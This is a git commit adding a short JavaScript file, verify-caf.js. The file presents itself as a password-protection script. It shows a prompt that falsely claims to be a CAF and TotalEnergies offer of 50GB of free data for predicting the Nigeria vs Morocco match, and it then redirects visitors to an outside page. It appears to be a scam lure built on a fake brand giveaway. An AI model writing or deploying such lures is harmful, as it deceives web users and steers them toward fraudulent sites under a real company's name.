c65a76bd94046a3192332c4ab37a9fdeabefda41
newblog13 <sweet16guyz@gmail.com>
2026-01-13 22:56:18 +0100

    Create verify-caf.js

---
+++ verify-caf.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'GET 50GB'
+password = prompt(
+  'CAF: Predict the winner of the match between NIGERIA VS MOROCCO and win 50GB from TOTALENERGIES instantly after the match.',
+  'GET 50GB'
+);
+if (password != 'GET 50GB') {
+  location.href = 'https://phivez.org/afcon2025.html';
+}
